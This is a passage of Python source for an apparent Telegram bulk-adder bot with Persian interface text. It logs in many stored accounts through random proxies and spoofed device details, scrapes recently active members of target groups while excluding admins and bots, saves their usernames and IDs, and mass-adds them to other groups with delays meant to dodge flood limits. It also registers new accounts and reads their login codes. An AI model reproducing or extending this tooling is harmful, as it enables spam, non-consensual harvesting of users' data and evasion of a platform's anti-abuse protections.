                            foo(tasklist[9], events, link, numacc, delay, worker_msg, mode, num, cancelALL))

                        tasklist = []

                        res1 = await t1
                        res2 = await t2
                        res3 = await t3
                        res4 = await t4
                        res5 = await t5
                        res6 = await t6
                        res7 = await t7
                        res8 = await t8
                        res9 = await t9
                        res10 = await t10

                        if res1 != None:
                            success += int(res1[0])
                            faild += int(res1[1])
                            duplicate += int(res1[2])

                        if res2 != None:
                            success += int(res2[0])
                            faild += int(res2[1])
                            duplicate += int(res2[2])

                        if res3 != None:
                            success += int(res3[0])
                            faild += int(res3[1])
                            duplicate += int(res3[2])

                        if res4 != None:
                            success += int(res4[0])
                            faild += int(res4[1])
                            duplicate += int(res4[2])

                        if res5 != None:
                            success += int(res5[0])
                            faild += int(res5[1])
                            duplicate += int(res5[2])

                        if res6 != None:
                            success += int(res6[0])
                            faild += int(res6[1])
                            duplicate += int(res6[2])

                        if res7 != None:
                            success += int(res7[0])
                            faild += int(res7[1])
                            duplicate += int(res7[2])

                        if res8 != None:
                            success += int(res8[0])
                            faild += int(res8[1])
                            duplicate += int(res8[2])

                        if res9 != None:
                            success += int(res9[0])
                            faild += int(res9[1])
                            duplicate += int(res9[2])

                        if res10 != None:
                            success += int(res10[0])
                            faild += int(res10[1])
                            duplicate += int(res10[2])

            remainAcc = len(tasklist)
            # print (remainAcc)
            for item in tasklist:

                if kosflag == 1:
                    break

                taskCount += 1

                t1 = bot.loop.create_task(foo(item, events, link, numacc, delay, worker_msg, mode, num, cancelALL))

                res = await t1

                if res != None:
                    success += int(res[0])
                    faild += int(res[1])
                    duplicate += int(res[2])

            kosflag = 0
            end = time.time()

            text =' ادد به گروه `{}` با ` {}` اکانت \nادد با هر اکانت : `{}`'.format(link, numacc, delay, str(datetime.timedelta(seconds=(end - start)))[0:7])

            try:
                await events.reply(text, buttons=[[Button.inline("✅موفق", "None"), Button.inline(str(success), "None")],
                                                  [Button.inline("❌ناموفق", "None"), Button.inline(str(faild), "None")],
                                                  [Button.inline("⚠️تکراری", "None"),
                                                   Button.inline(str(duplicate), "None")]])

            except Exception as e:
                print("---------> ", e, e.__class__)
                pass

        if callback.startswith("@"):

            [_, mode, link] = callback.split("|")

            print(link)

            cont = 0

            if '@' in link or 'joinchat' in link:
                ev = []

                if 'joinchat' in link:
                    link = link.split('/')[-1]

                if mode == "addUsername":

                    for item in os.scandir('Accounts'):
                        if 'journal' not in item.name and '.session' in item.name:
                            l = [[Button.inline(item.name, '*l|{}|{}'.format(item.name, link))]]
                            ev.extend(l)
                            cont += 1

                    try:
                        await events.reply(
                            '🔆 لطفا  یکی از اکانت ها رو انتخاب کنید تا در گروه  به نمایندگی  سایر ربات ها عضو شود \nhttps://t.me/joinchat/{}'.format(
                                link), buttons=ev)


                    except errors.rpcerrorlist.ReplyMarkupTooLongError:
                        for i in await list_splitter(ev, 20):
                            # print (i)

                            await events.reply(
                                '🔆 لطفا  یکی از اکانت ها رو انتخاب کنید تا در گروه  به نمایندگی  سایر ربات ها عضو شود  \nhttps://t.me/joinchat/{}'.format(
                                    link), buttons=i)

                if mode == "addChatid":
                    ev = [Button.inline('بستن ', 'close'), Button.inline('✅ Start', '#l|{}'.format(link))]

                    await events.reply(
                        '🔆 تمام اکانت ها فرایند جوین شد در \nhttps://t.me/joinchat/{} را آغاز کردن '.format(link),
                        buttons=ev)






            else:
                await events.reply(
                    '🔆 لطفا لینک رو به فرمت درست وارد کنید !\n🆘https://t.me/joinchat/example\n🆘@group')

        if callback.startswith("&cancelALL"):
            kosflag = 1
            await events.answer("‼️ All Accs Will Cancel")

        if callback.startswith("acccancell"):
            print(callback.split("|"))
            x = callback.split("|")[1]
            addflag[x] = "0"
            await events.answer("فرایند اد با این اکانت متوقف شد  !")

        if callback.startswith(".addcencell"):
            x = callback.split("|")[1]

            noadd = "0"
            await events.answer("فرایند اد با تمام اکانت ها متوقف شد  !")

        if callback.startswith("#l"):

            device = random.choice(devices)
            version1 = random.choice(version)

            [_, link] = callback.split('|')

            flag = 0

            count = 0

            for item in os.scandir('Accounts'):
                if 'journal' not in item.name and '.session' in item.name:

                    phone = item.name

                    count += 1
                    sleep(0.5)

                    await events.edit('| لطفا صبر کنید ..... \n👽 Bot : {} '.format(count),
                                      buttons=[[Button.inline("1️⃣", "✅"), Button.inline("2️⃣", "❌"), Button.inline("3️⃣", "❌"), Button.inline("4️⃣", "❌")],
                                          [Button.inline("✅ ", "✅"), Button.inline("❌", "✅"), Button.inline("❌", "✅"), Button.inline("❌", "✅")]])

                    #### --- anti flood
                    apis2 = getapiPhone(phone)

                    sleep(0.5)

                    if apis2 != 0:

                        try:

                            ww = False

                            await events.edit("/ لطفا صبر کنید ...n 👽 Bot : {}".format(count),
                                              buttons=[[Button.inline("1️⃣", "✅"), Button.inline("2️⃣", "❌"), Button.inline("3️⃣", "❌"), Button.inline("4️⃣", "❌")],
                                          [Button.inline("✅ ", "✅"), Button.inline("✅", "✅"), Button.inline("❌", "✅"), Button.inline("❌", "✅")]])
                            pr = await random_proxy()    
                            print(pr)          
                            # pr = random_proxy()
                            # proxy = proxy = (socks.SOCKS5, str(pr[0]), int(pr[1]), True, str(pr[2]), str(pr[3]))
                            client = TelegramClient('Accounts/{}'.format(phone), int(apis2[0]), apis2[1],
                                                    connection=connection.ConnectionTcpMTProxyRandomizedIntermediate,
                                                    proxy=pr,
                                                    device_model=device,
                                                    system_version=version1,
                                                    app_version="7.84",
                                                    lang_code='en',
                                                    system_lang_code='en')

                            await client.connect()

                            ww = await join(client, link, phone)

                            if ww == True:

                                keu = link

                                await events.edit('| لطفا صبر کنید ... Bot : {} '.format(count),
                                                  buttons=[[Button.inline("1️⃣", "✅"), Button.inline("2️⃣", "❌"), Button.inline("3️⃣", "❌"), Button.inline("4️⃣", "❌")],
                                          [Button.inline("✅ ", "✅"), Button.inline("✅", "✅"), Button.inline("✅", "✅"), Button.inline("❌", "✅")]])

                                if '@' in link:
                                    keu = link.split('@')[1]

                                if (flag):

                                    links = link

                                    if not '@' in link:
                                        links = 'https://t.me/joinchat/{}'.format(link)

                                    for item in await  client.get_participants(links):
                                        counter += 1




                                elif (flag == 0):

                                    f1 = open('Database/{}id.txt'.format(keu), 'w')

                                    counter = 0

                                    links = link

                                    if not '@' in link:
                                        links = 'https://t.me/joinchat/{}'.format(link)
                                    
                                    # async for item in client.iter_participants(links, aggressive=True):
                                    #     if online_within(item, 6):
                                    #         f1.write(str(item.id) + "\n")

                                    #         counter += 1
                                    myid = (await client.get_me()).id
                                    bbb = Client(tele_to_pyro('Accounts/{}'.format(phone).replace(".session", ""), myid), int(apis2[0]), apis2[1])
                                    async with bbb:
                                        countMember = await bbb.get_chat_members_count(links)
                                        countFor = 26 if countMember >= 5000 else int(countMember/200) + 1
                                        lists = []
                                        s = 0
                                        counter = 0
                                        for i in range(countFor):
                                            for item in await bbb.get_chat_members(links, offset=s, limit=200):
                                                if str(item.user.id) not in lists and online_within_pyro(item, 6):
                                                    lists.append(str(item.user.id))
                                                    f1.write(str(item.user.id) + '\n')
                                                    counter += 1
                                            s += 200
                                            time.sleep(6.5)
                                        await bbb.disconnect()

                                    f1.close()
                                    await bot.send_file(events.chat_id, 'Database/{}id.txt'.format(keu),
                                                        caption="♻️تعداد `{}` یوزر از گروه هدف با موفقیت جمع اوری شد!".format(
                                                            counter, keu))
                                    flag = 1

                                await events.edit('/ لطفا صبر کنید ...n 👽 Bot : {}'.format(count),
                                                  buttons=[[Button.inline("1️⃣", "✅"), Button.inline("2️⃣", "❌"),
                                                            Button.inline("3️⃣ : {}".format(counter), "❌"),
                                                            Button.inline("4️⃣", "❌")],
                                                           [Button.inline("✅ ", "✅"), Button.inline("✅", "✅"),
                                                            Button.inline("✅", "✅"), Button.inline("✅", "✅")]])

                                await client.disconnect()
                            elif ww == -1:
                                await events.edit('حساب شما حذف شده است ! ...')
                                await client.disconnect()
                            elif ww == -2:
                                await events.edit('ببخشید ربات از جلسات اخراج شد ...')
                                await client.disconnect()

                            elif ww == -3:
                                await events.edit("جلسه در دو آدرس IP مختلف اجرا شد لطفاً حساب دیگری را انتخاب کنید")
                                await client.disconnect()


                            elif ww == -4:
                                await events.edit("sessions Error")


                            elif ww == -1000:
                                await events.edit("FloodWait Error ")

                        except ValueError:
                            await events.respond("این لینک منقضی شده و یا درست نیست ")
                            await client.disconnect()

                        except errors.rpcerrorlist.FloodWaitError as e:
                            wait = [int(s) for s in str(e).split() if s.isdigit()][0]
                            await events.respond(" `FloodWait ` : {} \n یک حساب دیگر را امتحان کنید".format(wait))
                            await client.disconnect()

                        except Exception as e:
                            await events.respond(
                                " `Error ID PART ` : {} \n یک حساب دیگر را امتحان کنید".format(e.__class__))
                            await client.disconnect()

                    else:
                        await events.edit(
                            'خطا در یافتن داده های api برای حساب {}! لطفا دوباره وارد این حساب کاربری شوید!'.format(
                                phone))

            await events.reply("✅ کار تمام شد \n استفاده کنید save all ")

        if callback.startswith('*l'):

            device = random.choice(devices)
            version1 = random.choice(version)

            [_, phone, link] = callback.split('|')

            await events.answer('لطفا صبر کنید .....')
            sleep(0.5)

            await events.edit('| لطفا صبر کنید ..... ',
                              buttons=[[Button.inline("1️⃣", "✅"), Button.inline("2️⃣", "❌"), Button.inline("3️⃣", "❌"), Button.inline("4️⃣", "❌")],
                                          [Button.inline("✅ ", "✅"), Button.inline("❌", "✅"), Button.inline("❌", "✅"), Button.inline("❌", "✅")]])

            #### --- anti flood
            apis2 = getapiPhone(phone)

            sleep(0.5)

            if apis2 != 0:

                # try:

                ww = False

                await events.edit("/ لطفا صبر کنید ...",
                                  buttons=[[Button.inline("1️⃣", "✅"), Button.inline("2️⃣", "❌"), Button.inline("3️⃣", "❌"), Button.inline("4️⃣", "❌")],
                                          [Button.inline("✅ ", "✅"), Button.inline("✅", "✅"), Button.inline("❌", "✅"), Button.inline("❌", "✅")]])
                print("before client")
                print("get proxy")
                pr = await random_proxy()
                print(pr)
                # pr = random_proxy()
                # proxy = proxy = (socks.SOCKS5, str(pr[0]), int(pr[1]), True, str(pr[2]), str(pr[3]))
                client = TelegramClient('Accounts/{}'.format(phone).replace(".session", ""), int(apis2[0]), apis2[1], device_model=device,
                                        connection=connection.ConnectionTcpMTProxyRandomizedIntermediate,
                                        proxy=pr,
                                        system_version=version1,
                                        app_version="7.84",
                                        lang_code='en',
                                        system_lang_code='en')

                print("after client")
                await client.connect()
                print("afler connect")

                ww = await join(client, link, phone)  ### if user Already in group & joint in it -> ww = 1
                print("after join")

                if ww == True:

                    keu = link
                    await events.edit('| لطفا صبر کنید ...',
                                      buttons=[[Button.inline("1️⃣", "✅"), Button.inline("2️⃣", "❌"), Button.inline("3️⃣", "❌"), Button.inline("4️⃣", "❌")],
                                          [Button.inline("✅ ", "✅"), Button.inline("✅", "✅"), Button.inline("✅", "✅"), Button.inline("❌", "✅")]])

                    if '@' in link:
                        keu = link.split('@')[1]

                    f1 = open('Database/{}.txt'.format(keu), 'w')

                    counter = 0

                    links = link

                    if not '@' in link:
                        links = 'https://t.me/joinchat/{}'.format(link)

                    participants = await  client.get_participants(links, filter=ChannelParticipantsAdmins)
                    myid = (await client.get_me()).id
                    dontaddme = []
                    try:
                        for admins in participants:
                            if admins.username != None:
                                dontaddme.append(admins.username)
    
                        bbb = Client(tele_to_pyro('Accounts/{}'.format(phone).replace(".session", ""), myid), int(apis2[0]), apis2[1])
                        async with bbb:
                            countMember = await bbb.get_chat_members_count(links)
                            countFor = 26 if countMember >= 5000 else int(countMember/200) + 1
                            lists = []
                            s = 0
                            counter = 0
                            for i in range(countFor):
                                for item in await bbb.get_chat_members(links, offset=s, limit=200):
                                    if str(item.user.username) not in dontaddme and "bot" not in str(item.user.username) and "BOT" not in str(item.user.username) and "_bot" and str(item.user.username) not in lists and online_within_pyro(item, 6):
                                        lists.append(str(item.user.username))
                                        f1.write(str(item.user.username) + '\n')
                                        counter += 1
                                s += 200
                                time.sleep(6.5)
                            await bbb.disconnect()
                        # async for item in client.iter_participants(links, aggressive=True):
                        #     if item.username != None:

                        #         if online_within(item, 6) and str(item.username) not in dontaddme and "bot" not in str(
                        #                 item.username) and "BOT" not in str(item.username) and "_bot" not in str(
                        #                 item.username):
                        #             f1.write(str(item.username) + '\n')

                        #             counter += 1
        
                        # for item in await client.get_participants(links):
                        #     if item.username != None:

                        #         if online_within(item, 6) and str(item.username) not in dontaddme and "bot" not in str(
                        #                 item.username) and "BOT" not in str(item.username) and "_bot" not in str(
                        #                 item.username):
                        #             f1.write(str(item.username) + '\n')

                        #             counter += 1

                    except Exception as e:
                        print(str(e)) 
                    
                    f1.close()

                    await events.edit('/ لطفا صبر کنید ...',
                                      buttons=[[Button.inline("1️⃣", "✅"), Button.inline("2️⃣", "❌"), Button.inline("3️⃣ : {}".format(counter), "❌"), Button.inline("4️⃣", "❌")],
                                          [Button.inline("✅ ", "✅"), Button.inline("✅", "✅"), Button.inline("✅", "✅"), Button.inline("✅", "✅")]])
                    await bot.send_file(events.chat_id, file='Database/{}.txt'.format(keu),
                                        caption="♻️تعداد `{}` یوزر از گروه هدف با موفقیت جمع اوری شد!".format(counter, keu))
                    await client.disconnect()
                elif ww == -1:
                    await events.edit('Your account has been deleted ! ...')
                    await client.disconnect()
                elif ww == -2:
                    await events.edit('Sorry Bot kicked out from sessions ...')
                    await client.disconnect()

                elif ww == -3:
                    await events.edit("جلسه در دو آدرس IP مختلف اجرا شد لطفاً حساب دیگری را انتخاب کنید")
                    await client.disconnect()



            # except ValueError:
            #     await events.respond("این لینک منقضی شده و یا درست نیست ")
            #     await client.disconnect()

            # except errors.rpcerrorlist.FloodWaitError as e:
            #     wait = [int(s) for s in str(e).split() if s.isdigit()][0]
            #     await events.respond(f" `FloodWait ` : {wait} \n Try another Account")
            #     await client.disconnect()

            # except Exception as e:
            #     await events.respond(f" `Error ` : {e.__class__} \n Try another Account")
            #     await client.disconnect()

            else:
                await events.edit(
                    'خطا در یافتن داده های api برای حساب {}! لطفا دوباره وارد این حساب کاربری شوید!'.format(phone))


        elif callback == 'clean':
            usernames.clear()
            await events.edit('لیست نام های کاربری انجام شد اکنون خالی است!')


        elif callback == 'no':
            await events.edit('خوب من این روند را لغو می کنم')



        elif callback.startswith('save'):
            kuy = callback.split('|')[1]
            mfile = get_file(kuy.split('.txt')[0])

            print(kuy)  ### -- debug

            if mfile != 0:
                for item in mfile:

                    if ("id" in kuy):
                        userid.append(int(item.split('\n')[0]))
                    else:
                        usernames.append((item.split('\n')[0]))

                ev = []
                for item in os.scandir('Database'):
                    l = [[Button.inline(item.name, 'save|{}'.format(item.name))]]
                    ev.extend(l)
                if len(l) >= 1:
                    ev.extend([[Button.inline("cancel", "close")]])

                    if ("id" in kuy):

                        await events.edit(
                            '''🆔تعداد یوزرنیم های شما : `{}`


بایک کلیک یوزرای جمع شده را ذخیره کنید👇
                            '''.format(
                                len(list(set(userid)))), buttons=ev)

                    else:
                        await events.edit(
                            '''🆔تعداد یوزرنیم های شما : `{}`


بایک کلیک یوزرای جمع شده را ذخیره کنید👇
                            '''.format(
                                len(list(set(usernames)))), buttons=ev)


                else:
                    await events.reply('لیست خالی است ')



            else:
                await events.edit('مشکلی در لود فایل وجود دارد  ...')


        elif callback.startswith('getcodss'):
            phn = callback.split('|')[1]
            device = random.choice(devices)
            version1 = random.choice(version)
            apis2 = getapiPhone(phn)
            pr = await random_proxy()
            print(pr)
            # pr = random_proxy()
            # proxy = proxy = (socks.SOCKS5, str(pr[0]), int(pr[1]), True, str(pr[2]), str(pr[3]))
            client = TelegramClient('Accounts/{}'.format(phn).replace(".session", ""), int(apis2[0]), apis2[1], device_model=device,
                                    connection=connection.ConnectionTcpMTProxyRandomizedIntermediate,
                                    proxy=pr,
                                    system_version=version1,
                                    app_version="7.84",
                                    lang_code='en',
                                    system_lang_code='en')

            print("after client")
            await client.connect()
            for message in await client.get_messages(777000, limit=1):
                # code = re.findall(r'\d+', message.message)
                await events.reply(str(message.message))
            await client.disconnect()
        
        elif callback.startswith('settings'):
            phn = callback.split('|')[1]
            await events.reply('What you want with {} ?'.format(phn), buttons=[
                [Button.inline('🗑 حذف', 'delete|{}'.format(phn)), Button.inline('بستن ', 'close')]
            ])

        elif callback == 'close':
            await events.edit('پنل با موفقیت بسته شد')

        elif callback.startswith('delete'):
            pehen = callback.split('|')[1]
            try:
                os.remove('Accounts/{}'.format(pehen))
                await events.edit('اکانت {} با موفقیت از دیتابیس پاک شد !'.format(pehen))
            except:
                await events.edit('مشکلی در پاک کردن {} از دیتابیس وجود دارد ! '.format(pehen))




        elif (callback.startswith("add")):
            ev = []
            datas = callback.split("|")
            for item in os.scandir(f'Accounts'):
                if 'journal' not in item.name and '.session' in item.name:
                    ev.append(item.name)

            mode = datas[0]

            datas[1] = datas[1].strip()

            if 'joinchat' in datas[1]:
                link = datas[1]
            elif '@' in datas[1]:
                link = datas[1]
            else:
                link = None
            print(datas)   
            print(link)   
            if link != None:
                if (len(ev) < int(datas[2])):
                    await events.reply(
                        "**⚠️ تعداد اکانت های مجود کم تر از مقدار سفارش شما است ! لطفا تعداد اکانت کم تری رو سفارش بدید !  **")
                else:
                    msg = await events.reply('لطفا صبر کنید .....')
                    await worker(msg, datas[1], datas[2], datas[3], mode, usernames)
            else:
                await events.reply('🔆 اطلاعات گروه مقصد نادرست است ')

        # Help
    if (int(events.original_update.user_id) in NStEVJzsyY) or (int(events.original_update.user_id) in admins):
        if callback == 'backhelp':
            await events.edit('به ربات NajiAdder خوش اومدی',buttons=KEYBOARDHOME)
            datauser.clear()
        elif callback == 'fileadd':
            datauser["typeusers2"] = [".", "."]
            datauser["typeusers"] = ["filestyp", str(events.chat_id)]
            await events.edit("please send file")
        elif callback == 'help-all':
            await events.edit('''تست''')
        elif callback == 'help-login':
            await events.edit('''شماره را بفرستید''',buttons=[[Button.inline('برگشت', 'backhelp')]])
            datauser["typeusers2"] = [".", "."]
            datauser["typeusers"] = ["phoneadd", str(events.chat_id)]
            
        elif callback == 'help-extra':
            await events.edit('''
لطفا ایدی را به این صورت بفرستید 

@link 
    
    ◾️شروع یوزرگیری از گروه''',buttons=[[Button.inline('برگشت', 'backhelp')]])
            datauser["typeusers2"] = [".", "."]
            datauser["typeusers"] = ["get", str(events.chat_id)]
 
        elif callback == 'help-numbers':
            ev = []
            tl = 0
            for item in os.scandir('Accounts'):
                if 'journal' not in item.name and '.session' in item.name:
                    l = [[Button.inline(item.name, 'settings|{}'.format(item.name))]]
                    ev.extend(l)
                    tl += 1
            if tl >= 1:
                try:
                    await events.reply('شما  **{}**  اکانت دارید  '.format(tl), buttons=ev)

                except errors.rpcerrorlist.ReplyMarkupTooLongError:
                    async for i in await list_splitter(ev, 50):
                        await events.reply('شما  **{}**  اکانت دارید  '.format(tl), buttons=ev)

            else:
                await events.reply('دیتابیس خالی است !')

        elif callback == 'getcodphone':
            ev = []
            tl = 0
            for item in os.scandir('Accounts'):
                if 'journal' not in item.name and '.session' in item.name:
                    l = [[Button.inline(item.name, 'getcodss|{}'.format(item.name))]]
                    ev.extend(l)
                    tl += 1
            if tl >= 1:
                try:
                    await events.reply('شما  **{}**  اکانت دارید  '.format(tl), buttons=ev)

                except errors.rpcerrorlist.ReplyMarkupTooLongError:
                    async for i in await list_splitter(ev, 50):
                        await events.reply('شما  **{}**  اکانت دارید  '.format(tl), buttons=ev)

            else:
                await events.reply('دیتابیس خالی است !')

        elif callback == 'help-save':
            l = []
            ev = []
            for item in os.scandir('Database'):
                l = [[Button.inline(item.name, 'save|{}'.format(item.name))]]
                ev.extend(l)

            if len(l) >= 1:
                await events.reply('🔆 شما می توانید لیست تمام گروه های موجود در دیتابیس رو مشاهده کنید  ',
                                    buttons=ev)
            else:
                await events.reply('❌ لیست خالی است ')
    #         await events.edit('''save 
    
    # ◾️ذخیره کردن یوزرهای جمع آوری شده. سپس از منوی بازشده روی گروهی که استخراج انجام شده کلیک کنید یوزر ها ذخیره شود''',buttons=[[Button.inline('برگشت', 'backhelp')]])
        elif callback == 'help-status':
            await events.edit('🔆 تعداد کل username ها  : {}'.format(len(usernames)), buttons=[[Button.inline("clear", "clean"), Button.inline('برگشت', 'backhelp')]])
    #         await events.edit('''stats
    
    # ◾️مشاهده یوزرهای جمع شده در دیتابیس''',buttons=[[Button.inline('برگشت', 'backhelp')]])
        elif callback == 'help-add':
            await events.edit('''لطفا ایدی را به این صورت بفرستید 
@link
    ◾️اغاز فرایند اد با 6شماره همزمان و هرشماره 50 اد''',buttons=[[Button.inline('برگشت', 'backhelp')]])
            datauser["typeusers2"] = [".", "."]
            datauser["typeusers"] = ["add", str(events.chat_id)]
    #         await events.edit('''add @link 6 50
    
    # ◾️اغاز فرایند اد با 6شماره همزمان و هرشماره 50 اد''',buttons=[[Button.inline('برگشت', 'backhelp')]])
        elif callback == 'help-sudo':
            await events.edit('''.''',buttons=[[Button.inline('sudo list', 'llsudo'), Button.inline('del sudo', 'delsudooo')], [Button.inline('add sudo', 'addsudoo')],[Button.inline('برگشت', 'backhelp')]])
        elif callback == 'help-supp':
            await events.edit('''کاری بود این ایدی مدیره پیام بدین
    
    @ImTanun''',buttons=[[Button.inline('برگشت', 'backhelp')]])
        elif callback == 'addsudoo':
            datauser["typeusers2"] = [".", "."]
            datauser["typeusers"] = ["adsu", str(events.chat_id)]
            await events.edit('''ایدی عددی را بفرستید''',buttons=[[Button.inline('برگشت', 'backhelp')]])
        elif callback == 'delsudooo':
            datauser["typeusers2"] = [".", "."]
            datauser["typeusers"] = ["delsu", str(events.chat_id)]
            await events.edit('''ایدی عددی را بفرستید''',buttons=[[Button.inline('برگشت', 'backhelp')]])
        elif callback == 'lunche':
            datauser["typeusers2"] = [".", "."]
            datauser["typeusers"] = ["lunche", str(events.chat_id)]
            await events.edit('''دستور را بفرستید''',buttons=[[Button.inline('برگشت', 'backhelp')]])
        elif callback == 'paksazi':
            await events.edit('''انتخاب کنید''',buttons=[[Button.inline('اکانت', 'accdele')],[Button.inline('دیتابیس', 'datdele'), Button.inline('دلیتا', 'backhelp')],[Button.inline('برگشت', 'deledel')]])
        elif callback == 'accdele':
            shutil.rmtree('Accounts')
            os.mkdir('Accounts')
            await events.edit('''پاکسازی با موفقیت انجام شد''',buttons=[[Button.inline('برگشت', 'backhelp')]])

        elif callback == 'datdele':
            shutil.rmtree('Database')
            os.mkdir('Database')
            await events.edit('''پاکسازی با موفقیت انجام شد''',buttons=[[Button.inline('برگشت', 'backhelp')]])
        
        elif callback == 'deledel':
            shutil.rmtree('Delete')
            os.mkdir('Delete')
            await events.edit('''پاکسازی با موفقیت انجام شد''',buttons=[[Button.inline('برگشت', 'backhelp')]])

        elif callback == 'startlinkss':
            await events.edit("انتخاب کنید", buttons=[[Button.inline('بصورت دستی', 'menualstart')],[Button.inline('بصورت تکست', 'starttexts'), Button.inline('بصورت باتن', 'buttonstarts')], [Button.inline('برگشت', 'backhelp')]])

        elif callback == 'starttexts':
            datauser["typeusers2"] = [".", "."]
            datauser["typeusers"] = ["starttexts", str(events.chat_id)]
            await events.edit("لطفا لینک ربات را بفرستید", buttons=[[Button.inline('برگشت', 'backhelp')]])

        elif callback == 'menualstart':
            datauser["typeusers2"] = [".", "."]
            datauser["typeusers"] = ["menualstart", str(events.chat_id)]
            await events.edit("لطفا لینک ربات را بفرستید", buttons=[[Button.inline('برگشت', 'backhelp')]])

        elif callback == 'buttonstarts':
            datauser["typeusers2"] = [".", "."]
            datauser["typeusers"] = ["buttonstarts", str(events.chat_id)]
            await events.edit("لطفا لینک ربات را بفرستید", buttons=[[Button.inline('برگشت', 'backhelp')]])

        elif callback == 'llsudo':
            txt = ""
            for users in NStEVJzsyY:
                txt += "👽 " + str(users) + "\n ➖➖➖➖➖➖ \n"
            await events.edit(txt, buttons=[[Button.inline('sudo list', 'llsudo'), Button.inline('del sudo', 'delsudooo')], [Button.inline('add sudo', 'addsudoo'), Button.inline('برگشت', 'backhelp')]])

@bot.on(events.NewMessage())
async def _(event):
    global datauser
    
    try:
        if datauser["typeusers"][0] == "phoneadd":
            try:
                phones = event.text
                if os.path.exists('Accounts/{0}.session'.format(phones)):
                    await event.reply('**این اکانت از قبل در دیتابیس وجود داشته ! **')
                else:
                    await event.reply('**لطفا صبر کنید ......**')
                    result, xu = create_api(phones)
                    if result == False:
                        await event.reply(
                            '**مشکلی در ارسال کد به شماره  {} پیش اومده  ! \n احتمالا شماره شما محدود شده \n لطفا دوبره بعد از 48 ساعت تلاش کنید **'.format(
                                phones))
                    else:
                        await event.reply('''
    ✅ کد احراز هویت به شماره : {} ارسال شد ❕

    ❌لطفا کد ارسال شده رو بفرستید :
                            '''.format(event.text))
                        data['auth_mode'] = '{0}:{1}:{2}'.format(phones, result, xu)
                datauser["typeusers2"] = [".", "."]
                datauser["typeusers"] = ["codesforphone", str(event.chat_id)]  
                datauser["datas"] = [event.text]
            except Exception as e:
                print(str(e))
                await event.reply("لطفا دوباره امتخان کنید")

        elif datauser["typeusers"][0] == "codesforphone":
            try:
                print(data)
                w = random.choice(apis)
                device = random.choice(devices)
                version1 = random.choice(version)
                key = data['auth_mode']
                await event.reply('**لطفا صبر کنید ..... **')
                result, xu = auth(key.split(':')[0], key.split(':')[1], event.text,
                                    key.split(":")[2])
                if result == False:
                    await event.reply('**مشکی در ساخت api پیش اومده لطفا بعدا مجددا تلاش کنید ! **')
                    data.clear()
                else:
                    await event.reply('**✅ اکانت با موفقیت ثبت شد \n لطفا صبر کنید ......**')
                    api_info, xu = auth2(result, key.split(":")[2])
                    await event.reply(
                        '** Api `[{0}]` ب**ا موفقیت ساخته شد ** !\nلطفا صبر کنید ... \n یا کد را ارسال کنید ...**'.format(
                            api_info))
                    with open('apilist.txt', 'a') as file:
                        file.write('{0}:{1}:{2}'.format(api_info.split(':')[0], api_info.split(':')[1], key.split(':')[0]))
                        file.write("\n")
                        file.close()
                    data.clear()
                    pr = await random_proxy()
                    new = TelegramClient('Accounts/{0}'.format(key.split(':')[0]), w[0], w[1],
                                            connection=connection.ConnectionTcpMTProxyRandomizedIntermediate,
                                            proxy=pr,
                                            device_model=device,
                                            system_version=version1,
                                            app_version="7.84",
                                            lang_code='en',
                                            system_lang_code='en')

                    await new.connect()
                    if not await new.is_user_authorized():
                        try:
                            result = await new.send_code_request(key.split(':')[0])
                            data['code_mode'] = '{0}:{1}:{2}:{3}'.format(key.split(':')[0], result.phone_code_hash,
                                                                            api_info.split(':')[0], api_info.split(':')[1])
                            await new.disconnect()
                            await event.reply('''
    ** ✅ کد ورود به تلگرام ارسال شد لطفا کد رو بفرستید :
                                ''')
                            datauser["typeusers2"] = [".", "."]
                            datauser["typeusers"] = ["code2forphone", str(event.chat_id)]  
                            datauser["datas2"] = [event.text]
                        except Exception:
                            await event.reply('**مشکلی در ارسال کد پیش اومده لطفا دوباره سعی کنید ....**')
            except KeyError:
                await event.reply('**اکانتی در دیتابیس وجود  ندارد ! لطفا دوباره شماره رو وارد کنید **')

        elif datauser["typeusers"][0] == "code2forphone":
            try:
                print(data)
                device = random.choice(devices)
                version1 = random.choice(version)
                key = data['code_mode']
                await event.reply('**لطفا صبر کنید ..... **')
                print(key.split(':')[2], key.split(':')[3])
                pr = await random_proxy()
                new = TelegramClient('Accounts/{0}'.format(key.split(':')[0]), key.split(':')[2], key.split(':')[3],
                                        connection=connection.ConnectionTcpMTProxyRandomizedIntermediate,
                                        proxy=pr,
                                        device_model=device,
                                        system_version=version1,
                                        app_version="7.84",
                                        lang_code='en',
                                        system_lang_code='en')
                await new.connect()
                await new(functions.auth.SignInRequest(phone_number=key.split(':')[0], phone_code_hash=key.split(':')[1], phone_code=event.text))
                await event.reply('**اکانت با موفقیت لاگ شد**')
                data.clear()
            except errors.SessionPasswordNeededError:
                await event.reply(
                    '**اکانت رمز دو مرحله ای دارد لطفا رمز را بفرستید \n  ')
                data.clear()
                datauser["typeusers2"] = [".", "."]
                datauser["typeusers"] = ["pass2faadd", str(event.chat_id)]  
                datauser["datas3"] = [event.text]
                data['step_mode'] = key
            except KeyError:
                await event.reply('**لطفا دوباره تلاش کنید و شماره رو مجددا وارد کنید **')
            await new.disconnect()

        elif datauser["typeusers"][0] == "pass2faadd":
            try:
                print(data)
                device = random.choice(devices)
                version1 = random.choice(version)
                key = data['step_mode']
                m = await event.reply('**لطفا صبر کنید ..... **')
                k2 = random.choice(apis)
                pr = await random_proxy()
                new = TelegramClient('Accounts/{0}'.format(key.split(':')[0]), int(k2[0]), k2[1],
                                        connection=connection.ConnectionTcpMTProxyRandomizedIntermediate,
                                        proxy=pr,
                                        device_model=device,
                                        system_version=version1,
                                        app_version="7.84",
                                        lang_code='en',
                                        system_lang_code='en')
                await new.connect()
                await new.sign_in(password=event.text)
                data.clear()
                info = await new.get_me()
                result = None
                await new.disconnect()
                await event.reply(
                    '** \n 🔸🔹🔸🔹🔸🔹 \n 🎗 Api [{0}] با موفقیت به دیتابیس اضافه شد  !\n \n 🔸🔹🔸🔹🔸🔹 \n مشخصات اکانت \n 🎗 نام کاربری حساب : {1}\n \n 🔸🔹🔸🔹🔸🔹 \n 🎗 تلفن اکانت : +{2}\n  \n 🔸🔹🔸🔹🔸🔹 \n 🎗 نام حساب : {3}\n \n 🔸🔹🔸🔹🔸🔹\n 🎗 نام خانوادگی حساب : {4}** \n🔸🔹🔸🔹🔸🔹 \n'.format(
                        key.split(':')[2] + ':' + key.split(':')[3], str(info.username), str(info.phone),
                        info.first_name, info.last_name))
            except KeyError:
                await event.reply('**لطفا دوباره تلاش کنید و شماره رو مجددا وارد کنید **')
            except errors.PasswordHashInvalidError:
                await event.reply(
